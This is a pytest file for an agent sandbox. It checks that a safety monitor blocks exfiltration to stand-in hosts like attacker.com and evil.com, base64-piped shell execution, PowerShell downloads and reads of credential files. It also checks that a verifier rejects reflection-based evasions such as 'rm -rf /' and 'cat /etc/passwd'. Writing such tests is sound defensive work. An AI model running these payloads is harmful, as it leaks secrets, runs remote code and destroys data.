"""Tests for hardened LocalSandbox confinement and deep adversarial evasion interception."""

import os
import pytest
from pathlib import Path
from sage.environment.sandbox import LocalSandbox
from sage.environment.safety_monitor import SafetyMonitor
from sage.evolution.verifier import EvolutionVerifier


@pytest.fixture
def temp_sandbox_ws(tmp_path: Path) -> Path:
    ws = tmp_path / "hardened_ws"
    ws.mkdir(parents=True, exist_ok=True)
    return ws


def test_python_socket_and_urllib_network_exfiltration_blocked(temp_sandbox_ws: Path):
    """Verify that Python network socket and urllib exfiltration calls are blocked."""
    monitor = SafetyMonitor(strict_mode=True)
    sandbox = LocalSandbox(workspace_dir=temp_sandbox_ws, safety_monitor=monitor)

    payloads = [
        'python -c "import urllib.request; urllib.request.urlopen(\'http://attacker.com\')"',
        'python -c "import socket; s = socket.socket(); s.connect((\'1.2.3.4\', 80))"',
        'python -c "import requests; requests.post(\'http://leak.com\', data={})"',
        'python -c "import httpx; httpx.get(\'http://evil.com\')"',
    ]

    for p in payloads:
        res = sandbox.exec_command(p)
        assert res["blocked"] is True
        assert res["exit_code"] == 126
        assert "SECURITY BLOCK" in res["stderr"]


def test_powershell_and_base64_decode_obfuscation_blocked(temp_sandbox_ws: Path):
    """Verify that Base64 piped execution and PowerShell network transfer cmdlets are blocked."""
    monitor = SafetyMonitor(strict_mode=True)
    sandbox = LocalSandbox(workspace_dir=temp_sandbox_ws, safety_monitor=monitor)

    payloads = [
        "echo aGVsbG8= | base64 -d | sh",
        "echo payload | sh",
        "powershell -Command Invoke-WebRequest http://leak.com",
        "iwr http://evil.com -OutFile evil.exe",
    ]

    for p in payloads:
        res = sandbox.exec_command(p)
        assert res["blocked"] is True
        assert res["exit_code"] == 126
        assert "SECURITY BLOCK" in res["stderr"]


def test_host_credential_and_token_access_blocked(temp_sandbox_ws: Path):
    """Verify that access to host credentials and tokens is strictly blocked."""
    monitor = SafetyMonitor(strict_mode=True)
    sandbox = LocalSandbox(workspace_dir=temp_sandbox_ws, safety_monitor=monitor)

    payloads = [
        "cat ~/.kaggle/access_token",
        "cat .env",
        "type kaggle.json",
    ]

    for p in payloads:
        res = sandbox.exec_command(p)
        assert res["blocked"] is True
        assert res["exit_code"] == 126
        assert "SECURITY BLOCK" in res["stderr"]


def test_sanitized_environment_strips_host_secrets(temp_sandbox_ws: Path):
    """Verify that host API keys and tokens are completely stripped from child process environment."""
    os.environ["KAGGLE_API_TOKEN"] = "SECRET_TOKEN_123"
    os.environ["OPENAI_API_KEY"] = "SECRET_OPENAI_KEY"
    os.environ["GROQ_API_KEY"] = "SECRET_GROQ_KEY"

    sandbox = LocalSandbox(workspace_dir=temp_sandbox_ws)
    # Run benign command that inspects env
    res = sandbox.exec_command('python -c "import os; print(os.environ.get(\'KAGGLE_API_TOKEN\'), os.environ.get(\'OPENAI_API_KEY\'))"')
    assert res["exit_code"] == 0
    assert "None None" in res["stdout"]
    assert "SECRET_TOKEN_123" not in res["stdout"]


def test_verifier_ast_reflection_evasion_rejected():
    """Verify that EvolutionVerifier rejects dynamic reflection and __builtins__ evasions."""
    verifier = EvolutionVerifier()

    evasion_proposals = [
        {"prompt_addon": "getattr(__builtins__, 'exec')('malicious code')"},
        {"prompt_addon": "__builtins__['eval']('payload')"},
        {"prompt_addon": "importlib.import_module('os').system('cat /etc/passwd')"},
        {"prompt_addon": "__import__('subprocess').run('rm -rf /', shell=True)"},
        {"prompt_addon": "code = compile('print(1)', '', 'exec')"},
    ]

    for proposal in evasion_proposals:
        decision = verifier.verify_proposal(proposal)
        assert decision.approved is False
        assert decision.decision == "rejected"
        assert len(decision.rule_results) > 0
